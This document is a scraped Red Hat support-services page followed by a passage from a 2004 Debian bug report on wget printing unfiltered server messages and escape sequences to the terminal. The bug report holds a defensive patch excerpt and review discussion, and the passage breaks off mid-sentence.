=== Content from www.redhat.com_fdbed864_20250125_132220.html ===

[Skip to content](#rhb-main-content)
## Featured links

* [![Red Hat Summit](/themes/custom/rh_base_ui/dist/img/red-hat-summit-logo.svg)](https://www.redhat.com/en/summit)
* [Support](https://access.redhat.com/)
* [Documentation](https://docs.redhat.com/en)
* [Console](https://cloud.redhat.com/)
* [Developers](https://developers.redhat.com/)
* [Start a trial](/en/products/trials)
* All Red Hat
  + For customers
    - [Customer support](https://access.redhat.com/)
    - [Subscription management](https://access.redhat.com/management)
    - [Support cases](https://access.redhat.com/support/cases)
    - [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
    - [Find a partner](https://catalog.redhat.com/partners)
  + For partners
    - [Partner portal](https://connect.redhat.com/partner-admin/dashboard)
    - [Partner support](https://connect.redhat.com/en/support)
    - [Become a partner](https://connect.redhat.com/)
  + Try, buy, & sell
    - [Red Hat Marketplace](https://marketplace.redhat.com/en-us)
    - [Red Hat Store](https://www.redhat.com/en/store)
    - [Contact sales](/en/contact)
    - [Start a trial](/en/products/trials)
  + Learning resources
    - [Documentation](https://docs.redhat.com/en)
    - [Training and certification](/en/services/training-and-certification)
    - [Hybrid cloud learning hub](https://cloud.redhat.com/learn)
    - [Interactive labs](/en/interactive-labs)
    - [Learning community](https://learn.redhat.com/)
    - [Red Hat TV](https://tv.redhat.com)
  + Open source communities
    - [Global advocacy](https://access.redhat.com/accelerators)
    - [How we contribute](/en/about/our-community-contributions)
[Red Hat](/en)

* [Products](https://www.redhat.com/en/technologies/all-products)
* [Solutions](https://www.redhat.com/en/solutions)
* [Training & services](https://www.redhat.com/en/services)
* [Resources](https://www.redhat.com/en/resources)
* Partners
* [About](https://www.redhat.com/en/about)
* Explore more
### Platform products

* [Red Hat Enterprise LinuxA flexible, stable operating system to support hybrid cloud innovation.](/en/technologies/linux-platforms/enterprise-linux)
* [Red Hat OpenShiftA container platform to build, modernize, and deploy applications at scale.](/en/technologies/cloud-computing/openshift)
* [Red Hat Ansible Automation PlatformNew versionA foundation for implementing enterprise-wide automation.](/en/technologies/management/ansible)
### Try & buy

* [Start a trialAssess a product with a no-cost trial.](/en/products/trials)
* [Buy onlineBuy select products and services in the Red Hat Store.](https://www.redhat.com/en/store)
* [Integrate with major cloud providersBuy Red Hat solutions using committed spend from providers, including:
  ![Cloud providers: Amazon Web Services, Microsoft Azure, and Google Cloud](https://www.redhat.com/rhdc/managed-files/cloud-providers-2x.png)](/en/partners/certified-cloud-and-service-providers)
### Featured

* [Red Hat Enterprise Linux AI](/en/technologies/linux-platforms/enterprise-linux/ai)
* [Red Hat OpenShift AI](/en/technologies/cloud-computing/openshift/openshift-ai)
* [Red Hat OpenShift Virtualization](/en/technologies/cloud-computing/openshift/virtualization)
* [Red Hat OpenShift Service on AWS](/en/technologies/cloud-computing/openshift/aws)
* [Microsoft Azure Red Hat OpenShift](/en/technologies/cloud-computing/openshift/azure)
[See all products](/en/technologies/all-products)

* [Application platformSimplify the way you build, deploy, manage, and secure apps across the hybrid cloud.](/en/solutions/application-platform)
* [Artificial intelligenceBuild, deploy, and monitor AI models and apps with Red Hat's open source platforms.](/en/solutions/ai)
* [Edge computingDeploy workloads closer to the source with security-focused edge technology.](/en/products/edge)

* [IT automationUnite disparate tech, teams, and environments with 1 comprehensive automation platform.](/en/solutions/it-automation)
* [Linux standardizationGet consistency across operating environments with an open, flexible infrastructure.](/en/solutions/linux-standardization)

* [SecurityDeliver software using trusted platforms and real-time security scanning and remediation.](/en/solutions/trusted-software-supply-chain)
* [VirtualizationModernize operations using a single platform for virtualized and containerized workloads.](/en/solutions/virtualization)
### By industry

* [Automotive](/en/solutions/automotive)
* [Financial services](/en/solutions/financial-services)
* [Healthcare](/en/solutions/healthcare)
* [Industrial sector](/en/solutions/industrial-sector)
* [Media and entertainment](/en/solutions/media-entertainment)
* [Public sector](/en/solutions/public-sector)
* [Telecommunications](/en/solutions/telecommunications)
[Explore solutions](/en/solutions)
### [Services](/en/services)

* [Consulting](/en/services/consulting)
* [Services for AI](/en/services/consulting/red-hat-consulting-for-ai)
* [Technical Account Management](/en/services/support/technical-account-management)
### [Training & certification](/en/services/training-and-certification)

* [All courses and exams](/en/services/training/all-courses-exams)
* [All certifications](/en/services/certifications)
* [Verify a certification](https://www.redhat.com/rhtapps/services/verify/)
* [Skills assessment](https://skills.ole.redhat.com)
* [Learning subscription](/en/services/training/learning-subscription)
* [Learning community](https://learn.redhat.com/)
* [Red Hat Academy](/en/services/training/red-hat-academy)
* [FAQs](/en/services/training-and-certification/faq)
* [Connect with learning experts](/en/services/training-and-certification/contact-us)
### Featured

* [Ansible Basics: Automation Technical Overview (No cost)](/en/services/training/do007-ansible-essentials-simplicity-automation-technical-overview)
* [Containers, Kubernetes and Red Hat OpenShift Technical Overview (No cost)](/en/services/training/do080-deploying-containerized-applications-technical-overview)
* [Red Hat Enterprise Linux Technical Overview (No cost)](/en/services/training/rh024-red-hat-linux-technical-overview)
* [Red Hat Certified System Administrator exam](/en/services/training/ex200-red-hat-certified-system-administrator-rhcsa-exam)
* [Red Hat System Administration I](/en/services/training/rh124-red-hat-system-administration-i)
[Explore services](/en/services)
### Topics

* [AI](/en/topics/ai)
* [Application modernization](/en/topics/application-modernization)
* [Automation](/en/topics/automation)
* [Cloud computing](/en/topics/cloud-computing)
* [Cloud-native applications](/en/topics/cloud-native-apps)
* [Containers](/en/topics/containers)
* [DevOps](/en/topics/devops)
* [Edge computing](/en/topics/edge-computing)
* [Linux](/en/topics/linux)
* [Virtualization](/en/topics/virtualization)
* [See all topics](/en/topics)
### Articles

* [What is InstructLab?](/en/topics/ai/what-is-instructlab)
* [What are cloud services?](/en/topics/cloud-computing/what-are-cloud-services)
* [What is edge computing?](/en/topics/edge-computing/what-is-edge-computing)
* [What is hybrid cloud?](/en/topics/cloud-computing/what-is-hybrid-cloud)
* [Why build a Red Hat cloud?](/en/topics/cloud-computing/why-choose-red-hat-cloud)
* [Cloud vs. edge](/en/topics/cloud-computing/cloud-vs-edge)
* [Red Hat OpenShift vs. Kubernetes](/en/technologies/cloud-computing/openshift/red-hat-openshift-kubernetes)
* [Learning Ansible basics](/en/topics/automation/learning-ansible-tutorial)
* [What is Linux?](/en/topics/linux/what-is-linux)
### More to explore

* [Blog](/en/blog)
* [Customer success stories](/en/success-stories)
* [Events and webinars](/en/events)
* [Newsroom](/en/about/newsroom)
* [Podcasts and video series](/en/red-hat-original-series)
* [Documentation](https://docs.redhat.com/en)
* [Resource library](/en/resources)
* [Training and certification](/en/services/training-and-certification)
[Explore resources](/en/resources)
### For customers

* [Our partners](/en/partners)
* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
* [Find a partner](https://catalog.redhat.com/partners)
### For partners

* [Partner Connect](https://connect.redhat.com)
* [Become a partner](https://connect.redhat.com/en/benefits-of-being-a-partner)
* [Training](https://connect.redhat.com/en/training)
* [Support](https://connect.redhat.com/en/support)
* [Access the partner portal](https://connect.redhat.com/partner-admin/dashboard)
### About us

* [Our company](/en/about/company)
* [How we work](/en/about/our-culture)
* [Our social impact](/en/about/community-social-responsibility)
* [Development model](/en/about/development-model)
* [Subscription model](/en/about/value-of-Red-Hat)
* [Product support](/en/services/support)
### Open source

* [Open source commitments](/en/about/open-source)
* [How we contribute](/en/about/our-community-contributions)
* [Red Hat on GitHub](https://github.com/RedHatOfficial)
### Company details

* [Analyst relations](/en/about/analysts)
* [Blog](/en/blog)
* [Locations](/en/about/office-locations)
* [Newsroom](/en/about/newsroom)
[Explore Red Hat](/en/about)[Contact us](/en/contact)For customers

* [Customer support](https://access.redhat.com/)* [Subscription management](https://access.redhat.com/management)* [Support cases](https://access.redhat.com/support/cases)* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)* [Find a partner](https://catalog.redhat.com/partners)
For partners

* [Partner portal](https://connect.redhat.com/partner-admin/dashboard)* [Partner support](https://connect.redhat.com/en/support)* [Become a partner](https://connect.redhat.com/)
Try, buy, & sell

* [Red Hat Marketplace](https://marketplace.redhat.com/en-us)* [Red Hat Store](https://www.redhat.com/en/store)* [Contact sales](/en/contact)* [Start a trial](/en/products/trials)
Learning resources

* [Documentation](https://docs.redhat.com/en)* [Training and certification](/en/services/training-and-certification) * [Hybrid cloud learning hub](https://cloud.redhat.com/learn)* [Interactive labs](/en/interactive-labs)* [Learning community](https://learn.redhat.com/)* [Red Hat TV](https://tv.redhat.com)
Open source communities

* [Global advocacy](https://access.redhat.com/accelerators)* [How we contribute](/en/about/our-community-contributions)
For you
New
### Recommendations

As you browse redhat.com, we'll recommend resources you may like. For now, try these.

---

* [All Red Hat products](/en/technologies/all-products)
* [Tech topics](/en/topics)
* [Red Hat resources](/en/resources)
![close](https://static.redhat.com/libs/redhat/rh-iconfont/latest/svg/web-icon-close.svg)[![Red Hat Summit](/themes/custom/rh_base_ui/dist/img/red-hat-summit-logo.svg)Red Hat Summit](https://www.redhat.com/en/summit)[Support](https://access.redhat.com/)[Documentation](https://docs.redhat.com/en)[Console](https://cloud.redhat.com/)[Developers](https://developers.redhat.com/)[Start a trial](/en/products/trials)[Contact](/en/contact)Select a language简体中文EnglishFrançaisDeutschItaliano日本語한국어PortuguêsEspañol[Contact us](/en/contact)
English
### Select a language

* [简体中文](/zh/services/support)
* [English](/en/services/support)
* [Français](/fr/services/support)
* [Deutsch](/de/services/support)
* [Italiano](/it/services/support)
* [日本語](/ja/services/support)
* [한국어](/ko/services/support)
* [Português](/pt-br/services/support)
* [Español](/es/services/support)
Select a language简体中文EnglishFrançaisDeutschItaliano日本語한국어PortuguêsEspañol![](/themes/custom/rh_base_ui/dist/img/talk-bubble.svg)

* [Products](https://www.redhat.com/en/technologies/all-products)
* [Solutions](https://www.redhat.com/en/solutions)
* [Training & services](https://www.redhat.com/en/services)
* [Resources](https://www.redhat.com/en/resources)
* Partners
* [About](https://www.redhat.com/en/about)
* [Contact us](/en/contact)

### Select a language

* [简体中文](/zh/services/support)
* [English](/en/services/support)
* [Français](/fr/services/support)
* [Deutsch](/de/services/support)
* [Italiano](/it/services/support)
* [日本語](/ja/services/support)
* [한국어](/ko/services/support)
* [Português](/pt-br/services/support)
* [Español](/es/services/support)

# Red Hat Support

## Go beyond support by engaging with our experts

Our teams collaborate with you to ensure you accomplish your goals with Red Hat solutions. The relationship we build with you is designed to provide you with the tools and resources you need to find success on your IT journey.

![](/rhdc/managed-files/support-header.svg)

## Configured for your success

We develop a holistic understanding of your experience as a customer by ensuring our support and engineering teams work together.

Our support team works hand in hand with the best engineers in the industry to quickly turn customer feedback into product improvements. This direct line of communication allows us to hone in on proactive fixes that can impact your bottom line.

### Quick links

* Search our [Knowledgebase](https://access.redhat.com/search/#/?q=&p=1&sort=relevant&scoped&documentKind=Knowledgebase)
* Find [product documentation](https://access.redhat.com/documentation/en-us/)
* Access the [product security center](https://access.redhat.com/security/)
* Connect with [our support team](https://access.redhat.com/support)
* Team up with a [technical account manager](/en/services/support/technical-account-management "Technical account management")
* Take advantage of [partner support](https://connect.redhat.com/en/support)

## Find the right level of support

We have different tiers of support designed to meet your unique needs.

|  | Self-support | Standard | Premium |
| --- | --- | --- | --- |
| Access to Red Hat products | checkmark | checkmark | checkmark |
| Access to our knowledgebase and tools in our award-winning Customer Portal | checkmark | checkmark | checkmark |
| Access to support engineers during standard business hours |  | checkmark | checkmark |
| Access to support engineers 24x7 for high-severity issues |  |  | checkmark |

We also feature specialized support options that can be tailored to the unique needs of companies of all sizes and industries. The Red Hat® [Enhanced Solution Support](/en/resources/enhanced-solution-support-datasheet "Red Hat Enhanced Solution Support: 24x7 engineering support") offering reduces downtime and boosts confidence through access to senior level engineers, as well as resolution and restoration SLAs—helping you stay up and running as you innovate, scale, and deploy. Our engineers help restore your operations quickly and accelerate the path to final resolution, identifying the root cause which helps protect against recurrences in the future. Enhanced Solution Support engineers, who are already familiar with your environment, will be there to assist with critical issues in production environments so that you can consistently deliver the cloud services your customers demand. This offering is available for Red Hat OpenShift® and Red Hat OpenStack® Platform customers.

### Personalized support

Connect with a technical adviser for collaborative planning and specialized guidance. Our Technical Account Managers help you streamline deployments, resolve issues, and shape your technology strategy to meet your toughest business challenges.

[Explore Technical Account Management](/en/services/support/technical-account-management)

## Award winners since 2011

We’ve evolved the traditional software subscription model, combining the best elements of our services to exceed customer expectations. The Association of Support Professionals has honored Red Hat’s Customer Portal as one of “The Top Ten Best Support Websites” for 13 years running.

[See why the Customer Portal keeps earning industry recognition](https://access.redhat.com/)

![Gold and green star with text ASP best support websites of 2023](/rhdc/managed-files/ASP-Award-Design.jpg)

## What they're saying

![BSE logo](/rhdc/managed-files/bse-logo-2.png)

> Icon-Red\_Hat-Media\_and\_documents-Quotemark\_Open-B-Red-RGB
>
> We have found the support from Red Hat to be exemplary. Whenever we need anything from them, they have given it … Red Hat is now our backbone. Our business cannot run if Red Hat is not there.
>
> Ashishkumar Chauhan
>
> CEO, BSE

> Icon-Red\_Hat-Media\_and\_documents-Quotemark\_Open-B-Red-RGB
>
> I like the fact that they really dig into things and then provide answers. As the single Linux guy, I kind of need that second admin next to me sometimes to say, "Hey, what about this?" and I am able to do that through the portal. I get my questions answered and trouble tickets resolved.
>
> Erik Widholm
>
> Sr. Enterprise Engineer

[Read more user reviews](/en/technologies/linux-platforms/enterprise-linux/user-reviews)

## Have questions?

[Contact Support team](https://access.redhat.com/support)

[Visit the Customer Portal](https://access.redhat.com/)

[![Red Hat logo](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](/en)[LinkedIn](https://www.linkedin.com/company/red-hat)[YouTube](https://www.youtube.com/user/RedHatVideos)[Facebook](https://www.facebook.com/redhatinc)[X](https://twitter.com/RedHat)
### Products

* [Red Hat Enterprise Linux](/en/technologies/linux-platforms/enterprise-linux)
* [Red Hat OpenShift](/en/technologies/cloud-computing/openshift)
* [Red Hat Ansible Automation Platform](/en/technologies/management/ansible)
* [Cloud services](/en/technologies/cloud-computing/openshift/cloud-services)
* [See all products](/en/technologies/all-products)

### Tools

* [Training and certification](/en/services/training-and-certification)
* [My account](https://www.redhat.com/wapps/ugc/protected/personalInfo.html)
* [Customer support](https://access.redhat.com)
* [Developer resources](https://developers.redhat.com/)
* [Find a partner](https://catalog.redhat.com/partners)
* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
* [Red Hat value calculator](/en/solutions/value-calculator)
* [Documentation](https://docs.redhat.com/en)

### Try, buy, & sell

* [Product trial center](/en/products/trials)
* [Red Hat Marketplace](https://marketplace.redhat.com)
* [Red Hat Store](https://www.redhat.com/en/store)
* [Buy online (Japan)](https://www.redhat.com/en/about/japan-buy)
* [Console](https://cloud.redhat.com/)

### Communicate

* [Contact sales](/en/contact/sales)
* [Contact customer service](/en/contact/customer-service)
* [Contact training](/en/services/training-and-certification/contact-us)
* [Social](/en/about/social)

### About Red Hat

We’re the world’s leading provider of enterprise open source solutions—including Linux, cloud, container, and Kubernetes. We deliver hardened solutions that make it easier for enterprises to work across platforms and environments, from the core datacenter to the network edge.

### Select a language

![](https://static.redhat.com/libs/redhat/rh-iconfont/4/svg/web-icon-globe.svg)

* [简体中文](/zh/services/support)
* [English](/en/services/support)
* [Français](/fr/services/support)
* [Deutsch](/de/services/support)
* [Italiano](/it/services/support)
* [日本語](/ja/services/support)
* [한국어](/ko/services/support)
* [Português](/pt-br/services/support)
* [Español](/es/services/support)
### Red Hat legal and privacy links

* [About Red Hat](/en/about/company)
* [Jobs](/en/jobs)
* [Events](/en/events)
* [Locations](/en/about/office-locations)
* [Contact Red Hat](/en/contact)
* [Red Hat Blog](/en/blog)
* [Diversity, equity, and inclusion](/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

© 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](/en/about/privacy-policy)
* [Terms of use](/en/about/terms-use)
* [All policies and guidelines](/en/about/all-policies-guidelines)
* [Digital accessibility](/en/about/digital-accessibility)



=== Content from bugs.debian.org_bdf83406_20250125_132218.html ===

# Debian Bug report logs - #261755 wget: Server responses &c written to the tty verbatim (escape sequences, control characters, ...)

[![version graph](version.cgi?width=2;fixed=wget%2F1.9.1-5;fixed=wget%2F1.9.1-11;found=1.8.1-6.1;package=wget;collapse=1;absolute=0;height=2)](version.cgi?collapse=1;absolute=0;package=wget;found=1.8.1-6.1;info=1;fixed=wget%2F1.9.1-5;fixed=wget%2F1.9.1-11)

Package:
[wget](pkgreport.cgi?package=wget);
Maintainer for [wget](pkgreport.cgi?package=wget) is [Noël Köthe <noel@debian.org>](pkgreport.cgi?maint=noel%40debian.org); Source for [wget](pkgreport.cgi?package=wget) is [src:wget](pkgreport.cgi?src=wget) ([PTS](https://tracker.debian.org/pkg/wget), [buildd](https://buildd.debian.org/wget), [popcon](https://qa.debian.org/popcon.php?package=wget)).

Reported by: [Jan Minar <jjminar@fastmail.fm>](pkgreport.cgi?submitter=jjminar%40fastmail.fm)

Date: Wed, 28 Jul 2004 00:48:01 UTC

Severity: *grave*

Tags: patch, security

Found in version 1.8.1-6.1

Fixed in versions wget/1.9.1-5, wget/1.9.1-11

**Done:** Frank Lichtenheld <djpig@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=261755;mbox=yes), [status mbox](bugreport.cgi?bug=261755;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=261755;mbox=yes;mboxmaint=yes)

---

**Report forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=2), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

New Bug report received and forwarded. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=4), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=5), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Cc: bug-wget@gnu.org
Subject: wget: Server responses &c written to the tty verbatim (escape sequences, control characters, ...)
Date: Wed, 28 Jul 2004 02:31:09 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=5) (text/plain, inline)]
```
```
Package: wget
Version: 1.8.1-6.1
Severity: grave
Justification: user security hole
Tags: security patch

Hi.

Wget does absolutely no filtering of the server-supplied error messages,
and redirection URLs.  And probably just anywhere else.

Both 1.8 & 1.9 branches exhibit this behaviour.

A simple not-very-functional demo is attached.

I found out there are just too many places where wget should filter, but
doesn't.  The enclosed patch is covering just one of these places,
sadly.  And even this tiny bit is covered badly, as, e.g., there's no
need to mark the message as server-generated, when in fact it's our
message about the lack of any message from the server, heh.

The comments in the patch should explain my reasoning in detail -- the
basic goals:

(1) Filter escape sequences & friends
	-- HTTP 1.1 RFC allows [^\r\n\x00-\x1f\127]
(2) Mark the beginning & the end, and purpose of the message (``Remote
 	server said: >>> ... <<<'')
(3) Don't allow ending faking (remove extraneous whitespace, escape the end mark)
	-- ``A recipient MAY replace any linear white space with a single SP
	before interpreting the field value''  -- RFC 2616, Section 2.2

Please CC me, when appropriate.

Cheers.
Jan.

-- System Information
Debian Release: 3.0
Architecture: i386
Kernel: Linux kontryhel 2.4.26-jan #3 SMP Mon Apr 19 05:00:00 CEST 2004 i686
Locale: LANG=C, LC_CTYPE=cs_CZ.ISO-8859-2

Versions of packages wget depends on:
ii  libc6                         2.2.5-11.5 GNU C Library: Shared libraries an

--
   "To me, clowns aren't funny. In fact, they're kind of scary. I've wondered
 where this started and I think it goes back to the time I went to the circus,
			  and a clown killed my dad."

```
```
[[wgettrap](bugreport.cgi?att=1;bug=261755;filename=wgettrap;msg=5) (text/plain, attachment)]
```
```
[[wget.scam.patch](bugreport.cgi?att=2;bug=261755;filename=wget.scam.patch;msg=5) (text/plain, attachment)]
```
```
[[Message part 4](bugreport.cgi?att=3;bug=261755;msg=5) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=7), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent** to `Florian Weimer <fw@deneb.enyo.de>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=9), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=10), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=fw%40deneb.enyo.de)
From: Florian Weimer <fw@deneb.enyo.de>
To: 261755@bugs.debian.org
Subject: Patch review
Date: Fri, 30 Jul 2004 20:25:37 +0200
```
+	/* We encode each byte using at most 4 bytes, + trailing '\0'. */
+	buf = xmalloc (4 * strlen (reason_phrase_ptr) + 1);

Where is this buffer freed?  Or is this compatible with the existing
approach to memory management in wget?

-	  logprintf (LOG_NOTQUIET, _("%s ERROR %d: %s.\n"),
+	  /*
+	   * XXX Let's not allow the attacker pretend it's us speaking.
+	   *
+	   * It's important to:
+	   * (1) Explain who created the message
+	   * (2) Mark very visibly the beginning & end of the message
+	   * (3) Make clear we have no connection whatsoever with this message
+	   */
+	  /* logprintf (LOG_NOTQUIET, _("%s ERROR %d: %s.\n"), */
+	  logprintf (LOG_NOTQUIET,
+			_("%s ERROR: Remote server said: >>> %d %s <<<.\n"),

I suppose that it would be better to use C-style quoting (with "")
instead of yet another ad-hoc string literal syntax.  To increase
backwards compatibility, it's probably best to add the quotes only if
potentially harmful characters are actually contained in the server
response.

Note that you'd also have to change escape_reason_phrase().

-	  logprintf (LOG_NOTQUIET, "%d %s\n\n", hstat.statcode, hstat.error);
+	  logprintf (LOG_NOTQUIET, _(">>> %d %s <<<\n\n"),
+			  hstat.statcode, hstat.error);

Same here.

What's the status of this bug with respect to upstream?  Has it been
sent in for review?

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=12), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=12), [link](#11)).

---

**Acknowledgement sent** to `Noèl Köthe <noel@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=14), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=14), [link](#13)).

---

[Message #15](#15) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=15), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=15), reply):

![](/cgi-bin/libravatar.cgi?email=noel%40debian.org)
From: Noèl Köthe <noel@debian.org>
To: Florian Weimer <fw@deneb.enyo.de>, 261755@bugs.debian.org
Subject: Re: Bug#261755: Patch review
Date: Fri, 30 Jul 2004 21:47:16 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=15) (text/plain, inline)]
```
```
Am Fr, den 30.07.2004 schrieb Florian Weimer um 20:25:

> What's the status of this bug with respect to upstream?  Has it been
> sent in for review?

bug/patch submitter CC: the report to the upstream mailinglist (archive:
<http://www.mail-archive.com/wget%40sunsite.dk/>) but there is no answer
to the mail until now.

--
Noèl Köthe <noel debian.org>
Debian GNU/Linux, www.debian.org

```
```
[[signature.asc](bugreport.cgi?att=1;bug=261755;filename=signature.asc;msg=15) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=17), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=17), [link](#16)).

---

**Acknowledgement sent** to `Noèl Köthe <noel@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=19), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=19), [link](#18)).

---

[Message #20](#20) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=20), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=20), reply):

![](/cgi-bin/libravatar.cgi?email=noel%40debian.org)
From: Noèl Köthe <noel@debian.org>
To: Florian Weimer <fw@deneb.enyo.de>, 261755@bugs.debian.org
Cc: Jan Minar <jjminar@fastmail.fm>
Subject: Re: Bug#261755: Patch review
Date: Wed, 11 Aug 2004 13:08:24 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=20) (text/plain, inline)]
```
```
Am Fr, den 30.07.2004 schrieb Florian Weimer um 20:25:

Hello,

fullquote because Jan asked for CC: and the previous mail wasn't CC: to
him.

> +	/* We encode each byte using at most 4 bytes, + trailing '\0'. */
> +	buf = xmalloc (4 * strlen (reason_phrase_ptr) + 1);
>
> Where is this buffer freed?  Or is this compatible with the existing
> approach to memory management in wget?
>
> -	  logprintf (LOG_NOTQUIET, _("%s ERROR %d: %s.\n"),
> +	  /*
> +	   * XXX Let's not allow the attacker pretend it's us speaking.
> +	   *
> +	   * It's important to:
> +	   * (1) Explain who created the message
> +	   * (2) Mark very visibly the beginning & end of the message
> +	   * (3) Make clear we have no connection whatsoever with this message
> +	   */
> +	  /* logprintf (LOG_NOTQUIET, _("%s ERROR %d: %s.\n"), */
> +	  logprintf (LOG_NOTQUIET,
> +			_("%s ERROR: Remote server said: >>> %d %s <<<.\n"),
>
> I suppose that it would be better to use C-style quoting (with "")
> instead of yet another ad-hoc string literal syntax.  To increase
> backwards compatibility, it's probably best to add the quotes only if
> potentially harmful characters are actually contained in the server
> response.
>
> Note that you'd also have to change escape_reason_phrase().
>
> -	  logprintf (LOG_NOTQUIET, "%d %s\n\n", hstat.statcode, hstat.error);
> +	  logprintf (LOG_NOTQUIET, _(">>> %d %s <<<\n\n"),
> +			  hstat.statcode, hstat.error);
>
> Same here.
>
> What's the status of this bug with respect to upstream?  Has it been
> sent in for review?

Still no answer from upstream to Jans patch/bug.

--
Noèl Köthe <noel debian.org>
Debian GNU/Linux, www.debian.org

```
```
[[signature.asc](bugreport.cgi?att=1;bug=261755;filename=signature.asc;msg=20) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Noèl Köthe <noel@debian.org>`:

`Bug#261755`; Package `wget`.
([full text](bugreport.cgi?bug=261755;msg=22), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=22), [link](#21)).

---

**Acknowledgement sent** to `Jan Minar <jjminar@fastmail.fm>`:

Extra info received and forwarded to list. Copy sent to `Noèl Köthe <noel@debian.org>`.
([full text](bugreport.cgi?bug=261755;msg=24), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=24), [link](#23)).

---

[Message #25](#25) received at 261755@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=25), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=25), reply):

![](/cgi-bin/libravatar.cgi?email=jjminar%40fastmail.fm)
From: Jan Minar <jjminar@fastmail.fm>
To: Noel Köthe <noel@debian.org>
Cc: Florian Weimer <fw@deneb.enyo.de>, 261755@bugs.debian.org
Subject: Re: Bug#261755: Patch review
Date: Fri, 13 Aug 2004 03:22:40 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=261755;msg=25) (text/plain, inline)]
```
```
On Wed, Aug 11, 2004 at 01:08:24PM +0200, Noel Köthe wrote:
> Am Fr, den 30.07.2004 schrieb Florian Weimer um 20:25:

> fullquote because Jan asked for CC: and the previous mail wasn't CC: to
> him.

Thanks.  Note that when you send a mail to <number>@bugs.debian.org, the
original submitter is *not* sent a copy; you have to CC: the submitter
explicitly.

> > +	/* We encode each byte using at most 4 bytes, + trailing '\0'. */
> > +	buf = xmalloc (4 * strlen (reason_phrase_ptr) + 1);
> >
> > Where is this buffer freed?  Or is this compatible with the existing
> > approach to memory management in wget?

It isn't.  Did I mention I can't code in C?...

> > -	  logprintf (LOG_NOTQUIET, _("%s ERROR %d: %s.\n"),
> > +	  /*
> > +	   * XXX Let's not allow the attacker pretend it's us speaking.
> > +	   *
> > +	   * It's important to:
> > +	   * (1) Explain who created the message
> > +	   * (2) Mark very visibly the beginning & end of the message
> > +	   * (3) Make clear we have no connection whatsoever with this message
> > +	   */
> > +	  /* logprintf (LOG_NOTQUIET, _("%s ERROR %d: %s.\n"), */
> > +	  logprintf (LOG_NOTQUIET,
> > +			_("%s ERROR: Remote server said: >>> %d %s <<<.\n"),
> >
> > I suppose that it would be better to use C-style quoting (with "")
> > instead of yet another ad-hoc string literal syntax.

Let's split this effort in four consequential steps:

(I) Filtering the control characters (including escape-sequences).

This is easy, if it weren't for so many places in the code that have to
be changed, and the massive difference between the woody & sarge
version.  Just set the correct locale, do isprint(), and escape
appropriately.  This can and should be adopted without a delay.

The following steps deal primarily with the freeform server-response:

(II) Making it possible to determine what the server-response is

You have to ensure the beginning & ending delimiters are not spoofable.
With Unicode, where similar glyphs are not so uncommon, and '\n' being
supplied by the terminal by the virtue of wrapping, this soon gets
tricky.

The begin-delimiter is ``Remote server said: BEGIN_QUOT'', the
